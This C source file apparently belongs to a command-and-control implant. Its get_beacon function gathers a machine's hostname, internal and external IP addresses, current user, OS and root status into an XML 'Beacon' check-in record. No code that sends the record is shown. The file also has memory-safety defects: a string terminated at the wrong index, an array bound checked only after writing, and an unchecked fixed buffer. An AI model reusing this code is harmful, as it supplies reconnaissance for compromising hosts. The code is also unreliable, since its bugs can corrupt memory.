#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pwd.h>
#include <errno.h>
#include <sys/utsname.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <ifaddrs.h>
#include <sys/socket.h>
#include <netdb.h>

#include "utils.h"

#define MAX_IP_ENTRY_SIZE 64

/**
 * Uses getifaddrs to create a list of the host's IPv4 addresses mapped to the.
 * respective interface name. Each mapping is represented by a string of format
 * "<IPv4 address>@<interface_name>", e.g. "10.0.0.1@eth0".
 *
 * The loopback address ("127.0.0.1") is discarded.
 *
 * Accepts a char* array that can contain up to max_addrs IPv4 addresses.
 *
 * Returns the number of IPv4 addresses found.
 */
static int get_ips(char *addrs[], size_t max_addrs) {
	addrs[0] = NULL;
	struct ifaddrs *ifaddr, *ifa;
	if (getifaddrs(&ifaddr) == -1) {
		perror("getifaddrs");
		return 0;
	}

	int n, i = 0;
	for (ifa = ifaddr, n = 0; ifa != NULL; ifa = ifa->ifa_next, n++) {
		if (ifa->ifa_addr == NULL)
        	continue;

        if (ifa->ifa_addr->sa_family == AF_INET) { // only ipv4
        	char host[NI_MAXHOST];
        	int ret = getnameinfo(ifa->ifa_addr,
						   		 sizeof(struct sockaddr_in),
                           		 host, NI_MAXHOST,
                           		 NULL, 0, NI_NUMERICHOST);
            char *address = (ret == 0) ? host : "";
            if (strncmp(address, "127", 3) == 0) // skip loopback addresses
            	continue;
            
            char *entry = malloc(MAX_IP_ENTRY_SIZE);
        	char *interface = ifa->ifa_name;
            sprintf(entry, "%s@%s", address, interface);
            addrs[i] = entry;
            i++;

            if (i > max_addrs)
            	break;
        }
	}
	
	return i;
}

/**
 * Determines whether the given IPv4 address is internal by checking its first
 * two octets. See https://en.wikipedia.org/wiki/Reserved_IP_addresses for a list
 * of private IPv4 addresses.
 *
 * Returns 1 if address is internal, 0 otherwise.
 */
static int is_internal_ip(char *_addr) {
	int priv = 0;
	
	/* Copy the IP address to a new buffer, because
	   strtok modifies its argument */	
	char addr[16];
	char *at = strchr(_addr, '@');
	int addr_len = (int) (at - _addr);
	strncpy(addr, _addr, addr_len);
	addr[addr_len + 1] = '\0';

	/* Get the first two octets as ints */
	char *fp, *sp;
	fp = strtok(addr, ".");
	sp = strtok(NULL, ".");
	long f = strtol(fp, NULL, 10);
	long s = strtol(sp, NULL, 10);
	
	// check if IPv4 is private base on first two numbers
	if ( f == 10 || f == 127 ||
		(f == 100 && s >= 64 && s <= 127) ||
		(f == 172 && s >= 16 && s <= 31) ||
		(f == 169 && s == 254) ||
		(f == 192 &&  s == 168))
		priv = 1;
	
	return priv;
}

#define BEACON_MAX_SIZE 2048
#define BEACON_FIELD_MAX_SIZE 128
#define MAX_IPS 100

char *get_beacon(void) {
	char *beacon = malloc(BEACON_MAX_SIZE);
	if (beacon == NULL)
		return NULL;

	char *pos = beacon;
	pos = append_buff(pos, "<Beacon>\n");

	char *hostname = malloc(BEACON_FIELD_MAX_SIZE);
	char *username = malloc(BEACON_FIELD_MAX_SIZE);
	char *os = malloc(BEACON_FIELD_MAX_SIZE);
	char admin;
	
	// Get hostname
	int r = gethostname(hostname, BEACON_FIELD_MAX_SIZE);
	if (r == -1) {
		fprintf(stderr, "gethostname: %s\n", strerror(errno));
		sprintf(hostname, "");
	}
	pos = append_buff(pos, "    <HostName>%s</HostName>\n", hostname);
	
	// Get IPs
	char *ips[MAX_IPS];
	int n = get_ips(ips, MAX_IPS);
	int i;
	for (i = 0; i < n; i++) {
		if (is_internal_ip(ips[i])) {
			pos = append_buff(pos, "    <InternalIP>%s</InternalIP>\n", ips[i]);
		} else {
			pos = append_buff(pos, "    <ExternalIP>%s</ExternalIP>\n", ips[i]);
		}
	}

	// Get current user
	struct passwd *pw;
	uid_t euid = geteuid();
	pw = getpwuid(euid);
	if (pw) {
		sprintf(username, "%s", pw->pw_name);
	} else {
		fprintf(stderr, "getpwuid: %s\n", strerror(errno));
		sprintf(username, "");
	}
	pos = append_buff(pos, "    <CurrentUser>%s</CurrentUser>\n", username);
	
	// Get OS
	struct utsname utsn;
	r = uname(&utsn);
	if (r == -1) {
		fprintf(stderr, "uname: %s\n", strerror(errno));
		sprintf(os, "");
	} else {
		sprintf(os, "%s", utsn.sysname); // release, version
	}
	pos = append_buff(pos, "    <OS>%s</OS>\n", os);
	
	// Get Admin
	uid_t uid = getuid();
	admin = (uid == 0 || euid == 0) ? 'Y' : 'N';
	pos = append_buff(pos, "    <Admin>%c</Admin>\n", admin);
	pos = append_buff(pos, "</Beacon>\n", os);
	
	free(hostname);
	free(username);
	free(os);
	
	return beacon;
}

